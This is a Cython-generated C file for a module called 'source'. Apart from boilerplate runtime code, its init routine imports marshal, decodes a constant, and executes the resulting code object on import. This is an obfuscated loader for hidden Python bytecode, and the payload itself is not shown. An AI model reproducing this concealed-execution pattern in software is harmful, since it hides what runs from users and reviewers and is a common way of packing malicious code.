    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 4, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 4, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 4, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 4, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_marshal, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_marshal, __pyx_t_1) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_marshal); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_loads); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyExecGlobals(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init source", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init source");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetAttr */
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

/* Globals */
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

/* PyExec */
static CYTHON_INLINE PyObject* __Pyx_PyExec2(PyObject* o, PyObject* globals) {
    return __Pyx_PyExec3(o, globals, NULL);
}
static PyObject* __Pyx_PyExec3(PyObject* o, PyObject* globals, PyObject* locals) {
    PyObject* result;
    PyObject* s = 0;
    char *code = 0;
    if (!globals || globals == Py_None) {
        globals = __pyx_d;
    } else if (!PyDict_Check(globals)) {
        PyErr_Format(PyExc_TypeError, "exec() arg 2 must be a dict, not %.200s",
                     Py_TYPE(globals)->tp_name);
        goto bad;
    }
    if (!locals || locals == Py_None) {
        locals = globals;
    }
    if (__Pyx_PyDict_GetItemStr(globals, __pyx_n_s_builtins) == NULL) {
        if (PyDict_SetItem(globals, __pyx_n_s_builtins, PyEval_GetBuiltins()) < 0)
            goto bad;
    }
    if (PyCode_Check(o)) {
        if (__Pyx_PyCode_HasFreeVars((PyCodeObject *)o)) {
            PyErr_SetString(PyExc_TypeError,
                "code object passed to exec() may not contain free variables");
            goto bad;
        }
        #if PY_VERSION_HEX < 0x030200B1 || (CYTHON_COMPILING_IN_PYPY && PYPY_VERSION_NUM < 0x07030400)
        result = PyEval_EvalCode((PyCodeObject *)o, globals, locals);
        #else
        result = PyEval_EvalCode(o, globals, locals);
        #endif
    } else {
        PyCompilerFlags cf;
        cf.cf_flags = 0;
#if PY_VERSION_HEX >= 0x030800A3
        cf.cf_feature_version = PY_MINOR_VERSION;
#endif
        if (PyUnicode_Check(o)) {
            cf.cf_flags = PyCF_SOURCE_IS_UTF8;
            s = PyUnicode_AsUTF8String(o);
            if (!s) goto bad;
            o = s;
        #if PY_MAJOR_VERSION >= 3
        } else if (!PyBytes_Check(o)) {
        #else
        } else if (!PyString_Check(o)) {
        #endif
            PyErr_Format(PyExc_TypeError,
                "exec: arg 1 must be string, bytes or code object, got %.200s",
                Py_TYPE(o)->tp_name);
            goto bad;
        }
        #if PY_MAJOR_VERSION >= 3
        code = PyBytes_AS_STRING(o);
        #else
        code = PyString_AS_STRING(o);
        #endif
        if (PyEval_MergeCompilerFlags(&cf)) {
            result = PyRun_StringFlags(code, Py_file_input, globals, locals, &cf);
        } else {
            result = PyRun_String(code, Py_file_input, globals, locals);
        }
        Py_XDECREF(s);
    }
    return result;
bad:
    Py_XDECREF(s);
    return 0;
}

/* PyExecGlobals */
static PyObject* __Pyx_PyExecGlobals(PyObject* code) {
    PyObject* result;
    PyObject* globals = __Pyx_Globals();
    if (unlikely(!globals))
        return NULL;
    result = __Pyx_PyExec2(code, globals);
    Py_DECREF(globals);
    return result;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyErrFetchRestore */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* CLineInTraceback */
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);  // XDECREF since it's only set on Py3 if cline
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
            /* If the code object creation fails, then we should clear the
               fetched exception references and propagate the new exception */
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* MainFunction */
#ifdef __FreeBSD__
#include <floatingpoint.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(WIN32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
    /* 754 requires that FP exceptions run in "no stop" mode by default,
     * and until C vendors implement C99's ways to control FP exceptions,
     * Python requires non-stop mode.  Alas, some platforms enable FP
     * exceptions by default.  Here we disable them.
     */
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_source = 1;
      #if PY_MAJOR_VERSION < 3
          initsource();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_source();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_source();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
